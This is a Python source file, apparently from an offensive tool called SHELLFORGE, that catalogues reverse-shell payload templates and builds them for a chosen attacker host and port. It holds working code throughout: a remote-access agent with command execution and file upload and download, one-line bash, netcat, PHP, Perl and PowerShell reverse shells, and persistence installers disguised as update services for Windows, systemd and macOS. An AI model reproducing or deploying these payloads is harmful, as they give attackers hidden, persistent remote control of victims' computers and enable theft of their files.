# SHELLFORGE — Copyright (C) 2025 DEDSEC <https://github.com/Unknownx007>
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Payload catalog — templates, metadata, builder."""

# ═══════════════════════════════════════════════════════════════════
# PYTHON AGENT (foreground)
# ═══════════════════════════════════════════════════════════════════
PY_AGENT = '''#!/usr/bin/env python3
# SHELLFORGE · Python Agent (foreground)
# -------------------------------------------------------------------
# OS         : Linux (Debian/Ubuntu/Arch/Fedora/Alpine), macOS 10.15+,
#              Windows (WSL / Git Bash / MSYS2), Android (Termux)
# Requires   : python3 >= 3.6, standard library only, outbound TCP
#              to {lhost}:{lport} allowed by firewall
# Behavior   : Interactive agent — exec / upload / download / info / kill
#              Auto-reconnects every 5 seconds on disconnect
# Persistence: FOREGROUND — dies if parent shell closes
#              For background, use "Python Agent (daemon)"
# Detection  : `ps aux | grep python3 {filename}` shows the process
#              `ss -tunp | grep {lport}` shows the connection
# -------------------------------------------------------------------

import socket, subprocess, os, sys, json, base64, time, platform

HOST = "{lhost}"
PORT = {lport}
KEY  = {key_repr}

def _x(d, k):
    if not k: return d
    k = k.encode()
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))

def _send(s, m):
    data = json.dumps(m).encode()
    if KEY: data = _x(data, KEY)
    s.sendall(len(data).to_bytes(4, "big") + data)

def _recv(s):
    hdr = s.recv(4)
    if not hdr: return None
    n = int.from_bytes(hdr, "big")
    data = b""
    while len(data) < n:
        chunk = s.recv(n - len(data))
        if not chunk: return None
        data += chunk
    if KEY: data = _x(data, KEY)
    return json.loads(data)

def _run():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            _send(s, {"type": "hello", "os": platform.system(),
                      "platform": platform.platform(),
                      "host": socket.gethostname(),
                      "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
                      "cwd": os.getcwd(), "pid": os.getpid()})
            while True:
                m = _recv(s)
                if m is None: break
                t = m.get("type")
                if t == "exec":
                    try:
                        r = subprocess.run(m["cmd"], shell=True, capture_output=True, timeout=120)
                        _send(s, {"type": "out",
                                  "stdout": r.stdout.decode("utf-8", "replace"),
                                  "stderr": r.stderr.decode("utf-8", "replace"),
                                  "rc": r.returncode})
                    except Exception as e:
                        _send(s, {"type": "out", "stdout": "", "stderr": str(e), "rc": -1})
                elif t == "upload":
                    try:
                        d = base64.b64decode(m["data"])
                        p = m["path"]
                        os.makedirs(os.path.dirname(p) or ".", exist_ok=True)
                        open(p, "wb").write(d)
                        _send(s, {"type": "ack", "ok": True, "size": len(d)})
                    except Exception as e:
                        _send(s, {"type": "ack", "ok": False, "err": str(e)})
                elif t == "download":
                    try:
                        d = open(m["path"], "rb").read()
                        _send(s, {"type": "data",
                                  "data": base64.b64encode(d).decode(),
                                  "size": len(d)})
                    except Exception as e:
                        _send(s, {"type": "data", "data": "", "err": str(e)})
                elif t == "info":
                    _send(s, {"type": "info", "host": socket.gethostname(),
                              "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
                              "cwd": os.getcwd(), "os": platform.platform(),
                              "pid": os.getpid()})
                elif t == "kill":
                    _send(s, {"type": "ack", "ok": True})
                    try: s.close()
                    except: pass
                    return
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    try: _run()
    except KeyboardInterrupt: pass
'''

# ═══════════════════════════════════════════════════════════════════
# PYTHON AGENT (daemon — survives shell close)
# ═══════════════════════════════════════════════════════════════════
PY_AGENT_DAEMON = '''#!/usr/bin/env python3
# SHELLFORGE · Python Agent (DAEMON)
# -------------------------------------------------------------------
# OS         : Linux (all), macOS 10.15+, Windows (any PowerShell-capable)
# Requires   : python3 >= 3.6, standard library only, outbound TCP
# Behavior   : Self-daemonizes — double-fork on POSIX, DETACHED_PROCESS
#              on Windows. Survives shell close, terminal close, SIGHUP.
#              Parent PID becomes 1 (fully orphaned). Reconnects every 5s.
# Persistence: yes — the shell can be closed and this keeps running
# Usage      : python3 {filename}        → daemon mode (default)
#              python3 {filename} --fg   → foreground (for debugging)
# Detection  : `ps -eo pid,ppid,cmd | grep python3` shows PPID=1
#              file descriptors point to /dev/null (fully detached)
# -------------------------------------------------------------------

import os, sys, subprocess

DAEMONIZE = "--fg" not in sys.argv

def _daemonize():
    if os.name == "nt":
        DETACHED_PROCESS = 0x00000008
        CREATE_NEW_PROCESS_GROUP = 0x00000200
        subprocess.Popen(
            [sys.executable, __file__, "--fg"],
            creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL, close_fds=True,
        )
        sys.exit(0)
    else:
        if os.fork() > 0: sys.exit(0)
        os.setsid()
        if os.fork() > 0: sys.exit(0)
        for fd in range(3):
            try: os.close(fd)
            except OSError: pass
        os.open(os.devnull, os.O_RDONLY)
        os.open(os.devnull, os.O_RDWR)
        os.open(os.devnull, os.O_RDWR)

if DAEMONIZE:
    _daemonize()

import socket, json, base64, time, platform

HOST = "{lhost}"
PORT = {lport}
KEY  = {key_repr}

def _x(d, k):
    if not k: return d
    k = k.encode()
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(d))

def _send(s, m):
    data = json.dumps(m).encode()
    if KEY: data = _x(data, KEY)
    s.sendall(len(data).to_bytes(4, "big") + data)

def _recv(s):
    hdr = s.recv(4)
    if not hdr: return None
    n = int.from_bytes(hdr, "big")
    data = b""
    while len(data) < n:
        chunk = s.recv(n - len(data))
        if not chunk: return None
        data += chunk
    if KEY: data = _x(data, KEY)
    return json.loads(data)

def _run():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            _send(s, {"type": "hello", "os": platform.system(),
                      "platform": platform.platform(),
                      "host": socket.gethostname(),
                      "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
                      "cwd": os.getcwd(), "pid": os.getpid()})
            while True:
                m = _recv(s)
                if m is None: break
                t = m.get("type")
                if t == "exec":
                    try:
                        r = subprocess.run(m["cmd"], shell=True, capture_output=True, timeout=120)
                        _send(s, {"type": "out",
                                  "stdout": r.stdout.decode("utf-8", "replace"),
                                  "stderr": r.stderr.decode("utf-8", "replace"),
                                  "rc": r.returncode})
                    except Exception as e:
                        _send(s, {"type": "out", "stdout": "", "stderr": str(e), "rc": -1})
                elif t == "upload":
                    try:
                        d = base64.b64decode(m["data"])
                        p = m["path"]
                        os.makedirs(os.path.dirname(p) or ".", exist_ok=True)
                        open(p, "wb").write(d)
                        _send(s, {"type": "ack", "ok": True, "size": len(d)})
                    except Exception as e:
                        _send(s, {"type": "ack", "ok": False, "err": str(e)})
                elif t == "download":
                    try:
                        d = open(m["path"], "rb").read()
                        _send(s, {"type": "data",
                                  "data": base64.b64encode(d).decode(),
                                  "size": len(d)})
                    except Exception as e:
                        _send(s, {"type": "data", "data": "", "err": str(e)})
                elif t == "info":
                    _send(s, {"type": "info", "host": socket.gethostname(),
                              "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
                              "cwd": os.getcwd(), "os": platform.platform(),
                              "pid": os.getpid()})
                elif t == "kill":
                    _send(s, {"type": "ack", "ok": True})
                    try: s.close()
                    except: pass
                    return
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    try: _run()
    except KeyboardInterrupt: pass
'''

# ═══════════════════════════════════════════════════════════════════
# BASH RAW
# ═══════════════════════════════════════════════════════════════════
BASH_RAW = '''#!/bin/bash
# SHELLFORGE · Bash raw reverse shell
# -------------------------------------------------------------------
# OS         : Linux — Debian, Ubuntu, Arch, Fedora, Alpine, CentOS
#              macOS: NO (default bash lacks /dev/tcp — install bash via brew)
# Requires   : bash >= 4.0 with /dev/tcp compiled in
# Behavior   : Raw interactive shell over TCP (no protocol, no file xfer)
# Persistence: NO — dies when parent shell closes
# Detection  : immediate outbound TCP, obvious `bash -i` in ps
# -------------------------------------------------------------------
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''

# ═══════════════════════════════════════════════════════════════════
# BASH DETACHED (survives shell close + retries)
# ═══════════════════════════════════════════════════════════════════
BASH_DETACHED = '''#!/bin/bash
# SHELLFORGE · Bash DETACHED reverse shell
# -------------------------------------------------------------------
# OS         : Linux (Debian/Ubuntu/Arch/Fedora/CentOS), WSL
#              macOS: NO (/dev/tcp missing by default)
# Requires   : bash >= 4.0 with /dev/tcp, `setsid` (util-linux — default)
# Behavior   : Setsid-detached loop — SURVIVES shell close, terminal close,
#              SIGHUP, logout. Reconnects every 5 seconds. Parent PID = 1
# Persistence: yes — background process, shell can be closed immediately
# Usage      : chmod +x {filename} && ./{filename}
#              (returns instantly — shell runs in background)
# Detection  : `ps -eo pid,ppid,sid,cmd | grep bash` — session leader, PPID=1
#              Frequent reconnects are loud on NetFlow/Zeek
# -------------------------------------------------------------------
setsid bash -c '
while true; do
    bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
    sleep 5
done
' </dev/null >/dev/null 2>&1 &
echo "[+] detached — reconnects every 5s"
'''

# ═══════════════════════════════════════════════════════════════════
# NETCAT MKFIFO
# ═══════════════════════════════════════════════════════════════════
NC_MKFIFO = '''#!/bin/bash
# SHELLFORGE · Netcat + mkfifo reverse shell
# -------------------------------------------------------------------
# OS         : Linux (all), macOS (BSD nc), BSD
#              Windows: NO (use powershell payload)
# Requires   : nc / netcat / ncat in PATH, /tmp writable
# Behavior   : Interactive shell over TCP via named pipe (portable across
#              nc implementations that lack -e)
# Persistence: NO — one-shot, dies when shell closes
# Detection  : visible nc + /bin/sh child processes
# -------------------------------------------------------------------
rm -f /tmp/.sf 2>/dev/null
mkfifo /tmp/.sf 2>/dev/null
cat /tmp/.sf | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/.sf
rm -f /tmp/.sf 2>/dev/null
'''

# ═══════════════════════════════════════════════════════════════════
# NETCAT DETACHED (survives shell close + retries)
# ═══════════════════════════════════════════════════════════════════
NC_DETACHED = '''#!/bin/bash
# SHELLFORGE · Netcat DETACHED reverse shell
# -------------------------------------------------------------------
# OS         : Linux (all), macOS (BSD nc)
# Requires   : nc / netcat / ncat, setsid, mkfifo
# Behavior   : Setsid-detached retry loop — SURVIVES shell close
#              Reconnects every 5 seconds. Parent PID = 1
# Persistence: yes — background process, shell can be closed immediately
# Detection  : short-lived nc connections every 5s are loud
#              Prefer python-agent-daemon if stealth matters
# -------------------------------------------------------------------
setsid bash -c '
while true; do
    rm -f /tmp/.sf 2>/dev/null
    mkfifo /tmp/.sf 2>/dev/null
    cat /tmp/.sf | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/.sf
    rm -f /tmp/.sf 2>/dev/null
    sleep 5
done
' </dev/null >/dev/null 2>&1 &
echo "[+] detached — reconnects every 5s"
'''

# ═══════════════════════════════════════════════════════════════════
# PHP
# ═══════════════════════════════════════════════════════════════════
PHP = '''<?php
/*
 * SHELLFORGE · PHP reverse shell
 * -----------------------------------------------------------------
 * OS         : Linux, macOS, Windows, BSD — any system with PHP CLI
 * Requires   : php >= 5.0, fsockopen enabled (default), /bin/sh
 * Behavior   : Single interactive shell over TCP, no reconnect
 * Persistence: NO — dies when shell exits
 * Usage      : php {filename}
 * Detection  : php process with outbound TCP, easy to spot
 * -----------------------------------------------------------------
 */
$sock = fsockopen("{lhost}", {lport});
$proc = proc_open("/bin/sh -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
'''

# ═══════════════════════════════════════════════════════════════════
# PERL
# ═══════════════════════════════════════════════════════════════════
PERL = '''#!/usr/bin/perl
# SHELLFORGE · Perl reverse shell
# -------------------------------------------------------------------
# OS         : Linux, macOS, BSD — perl is preinstalled on most systems
# Requires   : perl >= 5.8, Socket module (core)
# Behavior   : Interactive shell over TCP, no reconnect
# Persistence: NO — dies when shell exits
# Detection  : perl process with outbound TCP
# -------------------------------------------------------------------
use Socket;
$i = "{lhost}";
$p = {lport};
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
if (connect(S, sockaddr_in($p, inet_aton($i)))) {
    open(STDIN,  ">&S");
    open(STDOUT, ">&S");
    open(STDERR, ">&S");
    exec("/bin/sh -i");
}
'''

# ═══════════════════════════════════════════════════════════════════
# POWERSHELL (Windows)
# ═══════════════════════════════════════════════════════════════════
PS_BASIC = '''# SHELLFORGE · PowerShell reverse shell (Windows)
# -------------------------------------------------------------------
# OS         : Windows 7 / 8 / 10 / 11 / Server 2008+
# Requires   : PowerShell 2.0+ (default on Win7+), outbound TCP
#              to {lhost}:{lport}
# Behavior   : Interactive PowerShell shell over TCP, no reconnect
# Persistence: NO — dies when shell closes
# Usage      : powershell -ExecutionPolicy Bypass -File {filename}
# Detection  : PowerShell + outbound TCP flagged by Defender
# -------------------------------------------------------------------
$c = New-Object System.Net.Sockets.TCPClient("{lhost}", {lport})
$s = $c.GetStream()
[byte[]]$b = 0..65535 | %{0}
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object System.Text.ASCIIEncoding).GetString($b, 0, $i)
    $r = (iex $d 2>&1 | Out-String)
    $r2 = $r + "PS " + (pwd).Path + "> "
    $sb = ([text.encoding]::ASCII).GetBytes($r2)
    $s.Write($sb, 0, $sb.Length)
    $s.Flush()
}
$c.Close()
'''

# ═══════════════════════════════════════════════════════════════════
# POWERSHELL PERSIST (Windows Run key — survives reboot)
# ═══════════════════════════════════════════════════════════════════
PS_PERSIST = '''# SHELLFORGE · PowerShell PERSIST (Windows)
# -------------------------------------------------------------------
# OS         : Windows 7 / 8 / 10 / 11 / Server
# Requires   : PowerShell 2.0+, user-level access (HKCU — no admin)
# Behavior   : Installs HKCU Run key that fires the reverse shell on
#              every user login. Hidden window, persists across reboots
# Persistence: YES — registry value survives reboot
# Usage      : powershell -ExecutionPolicy Bypass -File {filename}
# Removal    : Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\
#              Windows\\CurrentVersion\\Run" -Name "SystemUpdate"
# -------------------------------------------------------------------
$payload = @"
`$c = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport});
`$s = `$c.GetStream();
[byte[]]`$b = 0..65535 | %{0};
while ((`$i = `$s.Read(`$b, 0, `$b.Length)) -ne 0) {
    `$d = (New-Object System.Text.ASCIIEncoding).GetString(`$b, 0, `$i);
    `$r = (iex `$d 2>&1 | Out-String);
    `$r2 = `$r + 'PS ' + (pwd).Path + '> ';
    `$sb = ([text.encoding]::ASCII).GetBytes(`$r2);
    `$s.Write(`$sb, 0, `$sb.Length); `$s.Flush()
}
"@
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
$cmd = "powershell -WindowStyle Hidden -EncodedCommand $encoded"
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
                 -Name "SystemUpdate" -Value $cmd
Write-Host "[+] Persistent reverse shell installed"
Write-Host "    Fires on next login. Run now with:"
Write-Host "    $cmd"
'''

# ═══════════════════════════════════════════════════════════════════
# SYSTEMD USER (Linux — survives reboot + auto-restart)
# ═══════════════════════════════════════════════════════════════════
SYSTEMD_USER = '''#!/bin/bash
# SHELLFORGE · systemd user service persistence (Linux)
# -------------------------------------------------------------------
# OS         : Linux with systemd — Ubuntu, Debian, Arch, Fedora, CentOS
# Requires   : systemd >= 226, bash with /dev/tcp
#              (optional) loginctl enable-linger $USER — for no-login boot
# Behavior   : Installs user-level systemd unit with Restart=always
#              Reconnects within 10s of disconnect, starts on next login
# Persistence: YES — survives reboot and shell close
# Usage      : chmod +x {filename} && ./{filename}
# Removal    : systemctl --user disable --now ssh-update.service
#              rm ~/.config/systemd/user/ssh-update.service
# -------------------------------------------------------------------

SVC_NAME="ssh-update"
SVC_DIR="$HOME/.config/systemd/user"
SVC_FILE="$SVC_DIR/${SVC_NAME}.service"

mkdir -p "$SVC_DIR"

cat > "$SVC_FILE" << 'SHELLFORGE_EOF'
[Unit]
Description=System Update Helper
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
SHELLFORGE_EOF

systemctl --user daemon-reload
systemctl --user enable --now "${SVC_NAME}.service"
echo "[+] Installed: $SVC_FILE"
echo "    Status: $(systemctl --user is-active ${SVC_NAME}.service)"
echo "    Logs:   journalctl --user -u ${SVC_NAME}.service -f"
'''

# ═══════════════════════════════════════════════════════════════════
# LAUNCHD (macOS — survives reboot)
# ═══════════════════════════════════════════════════════════════════
LAUNCHD = '''#!/bin/bash
# SHELLFORGE · launchd LaunchAgent persistence (macOS)
# -------------------------------------------------------------------
# OS         : macOS 10.10+
# Requires   : /bin/bash + nc (both default), user launch agent (no sudo)
# Behavior   : Installs LaunchAgent plist, starts on user login,
#              KeepAlive=true reconnects immediately on disconnect
# Persistence: YES — survives reboot and shell close
# Usage      : chmod +x {filename} && ./{filename}
# Removal    : launchctl unload ~/Library/LaunchAgents/com.user.update.plist
#              rm ~/Library/LaunchAgents/com.user.update.plist
# -------------------------------------------------------------------

PLIST_LABEL="com.user.update"
PLIST_PATH="$HOME/Library/LaunchAgents/${PLIST_LABEL}.plist"

mkdir -p "$(dirname "$PLIST_PATH")"

cat > "$PLIST_PATH" << 'SHELLFORGE_EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>while true; do rm -f /tmp/.sf; mkfifo /tmp/.sf; cat /tmp/.sf | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/.sf; sleep 5; done</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
SHELLFORGE_EOF

launchctl unload "$PLIST_PATH" 2>/dev/null
launchctl load "$PLIST_PATH"
echo "[+] Installed: $PLIST_PATH"
echo "    Label: $PLIST_LABEL"
echo "    Status: $(launchctl list | grep $PLIST_LABEL || echo 'loading…')"
'''


# ═══════════════════════════════════════════════════════════════════
# CATALOG
# ═══════════════════════════════════════════════════════════════════
PAYLOADS = {
    "python-agent": {
        "id": "python-agent",
        "name": "Python Agent",
        "category": "agent",
        "description": "Interactive agent with exec/upload/download, auto-reconnect",
        "os": ["linux", "macos", "windows"],
        "requires": ["python3 >= 3.6", "stdlib only"],
        "persistence": False,
        "default_filename": "agent.py",
        "has_key": True,
        "template": PY_AGENT,
    },
    "python-agent-daemon": {
        "id": "python-agent-daemon",
        "name": "Python Agent (daemon)",
        "category": "agent",
        "description": "Same agent, self-daemonizes — survives shell close",
        "os": ["linux", "macos", "windows"],
        "requires": ["python3 >= 3.6", "stdlib only"],
        "persistence": True,
        "default_filename": "agent_daemon.py",
        "has_key": True,
        "template": PY_AGENT_DAEMON,
    },
    "bash-raw": {
        "id": "bash-raw",
        "name": "Bash (raw)",
        "category": "raw",
        "description": "One-shot /dev/tcp reverse shell",
        "os": ["linux"],
        "requires": ["bash >= 4.0", "/dev/tcp support"],
        "persistence": False,
        "default_filename": "shell.sh",
        "has_key": False,
        "template": BASH_RAW,
    },
    "bash-detached": {
        "id": "bash-detached",
        "name": "Bash (detached)",
        "category": "persistence",
        "description": "setsid + retry — survives shell close",
        "os": ["linux"],
        "requires": ["bash >= 4.0", "setsid", "/dev/tcp support"],
        "persistence": True,
        "default_filename": "shell_daemon.sh",
        "has_key": False,
        "template": BASH_DETACHED,
    },
    "nc-mkfifo": {
        "id": "nc-mkfifo",
        "name": "Netcat (mkfifo)",
        "category": "raw",
        "description": "Portable mkfifo + nc reverse shell",
        "os": ["linux", "macos"],
        "requires": ["nc / netcat / ncat"],
        "persistence": False,
        "default_filename": "shell.sh",
        "has_key": False,
        "template": NC_MKFIFO,
    },
    "nc-detached": {
        "id": "nc-detached",
        "name": "Netcat (detached)",
        "category": "persistence",
        "description": "setsid + mkfifo + retry — survives shell close",
        "os": ["linux", "macos"],
        "requires": ["nc / netcat / ncat", "setsid"],
        "persistence": True,
        "default_filename": "shell_daemon.sh",
        "has_key": False,
        "template": NC_DETACHED,
    },
    "php": {
        "id": "php",
        "name": "PHP",
        "category": "raw",
        "description": "fsockopen + proc_open reverse shell",
        "os": ["linux", "macos", "windows"],
        "requires": ["php >= 5.0", "fsockopen enabled"],
        "persistence": False,
        "default_filename": "shell.php",
        "has_key": False,
        "template": PHP,
    },
    "perl": {
        "id": "perl",
        "name": "Perl",
        "category": "raw",
        "description": "Socket + exec reverse shell",
        "os": ["linux", "macos"],
        "requires": ["perl >= 5.8"],
        "persistence": False,
        "default_filename": "shell.pl",
        "has_key": False,
        "template": PERL,
    },
    "powershell": {
        "id": "powershell",
        "name": "PowerShell",
        "category": "raw",
        "description": "TCPClient reverse shell for Windows",
        "os": ["windows"],
        "requires": ["PowerShell 2.0+"],
        "persistence": False,
        "default_filename": "shell.ps1",
        "has_key": False,
        "template": PS_BASIC,
    },
    "powershell-persist": {
        "id": "powershell-persist",
        "name": "PowerShell (persist)",
        "category": "persistence",
        "description": "Hidden reverse shell via HKCU Run key",
        "os": ["windows"],
        "requires": ["PowerShell 2.0+", "user login"],
        "persistence": True,
        "default_filename": "persist.ps1",
        "has_key": False,
        "template": PS_PERSIST,
    },
    "systemd-user": {
        "id": "systemd-user",
        "name": "systemd user service",
        "category": "persistence",
        "description": "User unit with Restart=always, survives reboots",
        "os": ["linux"],
        "requires": ["systemd >= 226", "bash /dev/tcp"],
        "persistence": True,
        "default_filename": "install.sh",
        "has_key": False,
        "template": SYSTEMD_USER,
    },
    "launchd": {
        "id": "launchd",
        "name": "launchd LaunchAgent",
        "category": "persistence",
        "description": "macOS LaunchAgent with KeepAlive, survives reboots",
        "os": ["macos"],
        "requires": ["macOS 10.10+", "nc"],
        "persistence": True,
        "default_filename": "install.sh",
        "has_key": False,
        "template": LAUNCHD,
    },
}

CATEGORIES = ["agent", "raw", "persistence"]


def list_payloads():
    """Return metadata for all payloads (template excluded)."""
    return [{k: v for k, v in p.items() if k != "template"}
            for p in PAYLOADS.values()]


def get_payload(payload_id):
    """Return the full payload dict (including template) or None."""
    return PAYLOADS.get(payload_id)


def build(payload_id, lhost, lport, key=None):
    """Fill a template with the given parameters and return the string."""
    p = PAYLOADS.get(payload_id)
    if not p:
        raise ValueError(f"unknown payload: {payload_id}")
    tpl = p["template"]
    key_repr = repr(key) if key else "None"
    key_empty = key or ""
    filename = p["default_filename"]
    return (tpl
            .replace("{lhost}", str(lhost))
            .replace("{lport}", str(lport))
            .replace("{key_repr}", key_repr)
            .replace("{key}", key_empty)
            .replace("{filename}", filename))
